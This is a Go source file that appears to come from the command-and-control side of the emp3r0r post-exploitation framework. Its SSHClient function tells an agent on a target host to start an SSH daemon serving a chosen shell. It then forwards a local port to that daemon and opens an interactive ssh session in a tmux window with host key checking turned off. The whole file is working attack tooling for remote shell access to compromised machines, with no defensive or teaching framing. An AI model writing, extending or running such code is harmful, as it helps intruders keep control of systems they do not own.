package cc

import (
	"context"
	"errors"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// shell - port mapping
// one port for one shell
var SSHShellPort = make(map[string]string)

// SSHClient ssh to sshd server, with shell access in a new tmux window
// shell: the executable to run, eg. bash, python
// port: serve this shell on agent side 127.0.0.1:port
func SSHClient(shell, port string) (err error) {
	if !util.IsCommandExist("ssh") {
		err = fmt.Errorf("ssh must be installed")
		return
	}

	// bash or not
	lport := strconv.Itoa(util.RandInt(2048, 65535)) // shell gets mapped here
	new_port := strconv.Itoa(util.RandInt(2048, 65535))
	if port == emp3r0r_data.SSHDPort && shell != "bash" {
		port = new_port // reset port if trying to open shells other than bash
		SetOption([]string{"port", new_port})
		CliPrintWarning("Switching to a new port %s since we are not requesting bash", port)
	}
	if shell == "bash" {
		port = emp3r0r_data.SSHDPort // default shell is bash, on a random default port
		SetOption([]string{"port", emp3r0r_data.SSHDPort})
		CliPrintWarning("Switching to default bash port %s", emp3r0r_data.SSHDPort)
	}
	to := "127.0.0.1:" + port // decide what port/shell to connect to

	// is port mapping already done?
	exists := false
	for _, p := range PortFwds {
		if p.Agent == CurrentTarget && p.To == to {
			exists = true
			for s, p := range SSHShellPort {
				// one port for one shell
				// if trying to open a different shell on the same port, change to a new port
				if s != shell && p == port {
					new_port := strconv.Itoa(util.RandInt(2048, 65535))
					CliPrintWarning("Port %s has %s shell on it, restarting with a different port %s", port, s, new_port)
					SetOption([]string{"port", new_port})
					SSHClient(shell, new_port)
					return
				}
			}
			// if a shell is already open, use it
			CliPrintWarning("Using existing port mapping %s -> remote:%s for shell %s", p.Lport, port, shell)
			lport = p.Lport // use the correct port
			break
		}
	}

	if !exists {
		// start sshd server on target
		cmd := fmt.Sprintf("!sshd %s %s %s", shell, port, uuid.NewString())
		if shell != "bash" {
			err = SendCmdToCurrentTarget(cmd)
			if err != nil {
				return
			}
			CliPrintInfo("Starting sshd (%s) on target %s", shell, strconv.Quote(CurrentTarget.Tag))

			// wait until sshd is up
			defer func() {
				CmdResultsMutex.Lock()
				delete(CmdResults, cmd)
				CmdResultsMutex.Unlock()
			}()
			for {
				time.Sleep(100 * time.Millisecond)
				res, exists := CmdResults[cmd]
				if exists {
					if strings.Contains(res, "success") {
						break
					} else {
						err = fmt.Errorf("Start sshd (%s) failed: %s", shell, res)
						return
					}
				}
			}
		}

		// set up port mapping for the ssh session
		CliPrintInfo("Setting up port mapping (local %s -> remote %s) for sshd (%s)", lport, to, shell)
		pf := &PortFwdSession{}
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = lport, to
		go func() {
			err = pf.RunPortFwd()
			if err != nil {
				err = fmt.Errorf("PortFwd failed: %v", err)
				CliPrintError("Start port mapping for sshd (%s): %v", shell, err)
			}
		}()
		CliPrintInfo("Waiting for response from %s", CurrentTarget.Tag)
		if err != nil {
			return
		}
	}

	// wait until the port mapping is ready
	exists = false
wait:
	for i := 0; i < 100; i++ {
		if exists {
			break
		}
		time.Sleep(100 * time.Millisecond)
		for _, p := range PortFwds {
			if p.Agent == CurrentTarget && p.To == to {
				exists = true
				break wait
			}
		}
	}
	if !exists {
		err = errors.New("Port mapping unsuccessful")
		return
	}

	// let's do the ssh
	sshPath, err := exec.LookPath("ssh")
	if err != nil {
		CliPrintError("ssh not found, please install it first: %v", err)
	}
	sshCmd := fmt.Sprintf("%s -p %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1",
		sshPath, lport)
	CliPrintSuccess("Opening SSH (%s - %s) session for %s in new window. "+
		"If that fails, please execute command %s manaully",
		shell, port, CurrentTarget.Tag, strconv.Quote(sshCmd))

	// agent name
	name := CurrentTarget.Hostname
	label := Targets[CurrentTarget].Label
	if label != "nolabel" && label != "-" {
		name = label
	}

	// remeber shell-port mapping
	SSHShellPort[shell] = port
	return TmuxNewWindow(fmt.Sprintf("emp3r0r_shell-%d/%s/%s-%s", util.RandInt(0, 1024), name, shell, port), sshCmd)
}
